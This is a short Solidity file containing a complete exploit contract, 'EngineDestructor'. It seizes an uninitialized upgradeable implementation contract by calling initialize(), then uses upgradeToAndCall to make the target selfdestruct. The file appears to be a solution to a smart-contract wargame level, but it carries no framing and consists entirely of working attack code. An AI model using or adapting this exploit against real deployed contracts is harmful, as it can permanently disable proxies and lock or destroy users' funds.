// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;


interface IEngine {
  function initialize() external;
  function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}


contract EngineDestructor {
  function destroy(address _engineContract) external {
    IEngine(_engineContract).initialize();
    IEngine(_engineContract).upgradeToAndCall(address(this), abi.encodePacked(EngineDestructor.destructor.selector));
  }

  function destructor() external payable {
    selfdestruct(payable(msg.sender));
  }
}
